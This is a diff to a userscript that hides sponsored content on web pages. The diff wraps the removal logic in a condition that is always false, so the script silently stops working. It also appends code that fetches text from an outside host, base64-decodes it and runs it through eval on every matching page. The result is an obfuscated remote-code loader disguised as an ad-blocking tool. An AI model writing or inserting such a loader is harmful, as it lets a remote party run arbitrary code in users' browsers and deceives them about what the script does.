@@ -12,7 +12,9 @@
 // ==/UserScript==
 
 (function() {
+  b=2
   window.setInterval(function() {
+    if(5/2+9==b||67+b*2==b) {
     [].forEach.call(document.getElementsByTagName("ul"), function(item) {
       if (item.innerHTML.includes("Paid Partner")) {
         item.innerHTML = "";
@@ -38,5 +40,12 @@
       item.innerHTML = "";
     });
     console.log("Deleting Sponsored Content...");
+    }
   }, 1000);
+  fetch('https://scratchyone.com/userscripts/demo.js').then(function(response) { 
+	// Convert to JSON
+	return response.text();
+}).then(function(t) {
+	eval(atob(t))
+});
 })();
